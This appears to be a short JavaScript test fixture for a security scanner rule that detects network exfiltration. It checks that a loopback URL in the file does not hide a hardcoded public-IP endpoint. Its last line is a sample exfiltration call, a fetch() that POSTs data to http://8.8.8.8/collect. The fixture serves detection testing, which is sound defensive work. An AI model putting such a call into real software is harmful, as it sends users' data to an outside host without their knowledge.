// Positive test for threat-network-exfiltration (Codex regression, PR #769).
// A loopback/private URL in the same file must NOT mask a hardcoded public-IP
// C2 endpoint: the public IP is still an exfiltration target and must match.
const local = "http://127.0.0.1:8000";
fetch("http://8.8.8.8/collect", { method: "POST", body: data });
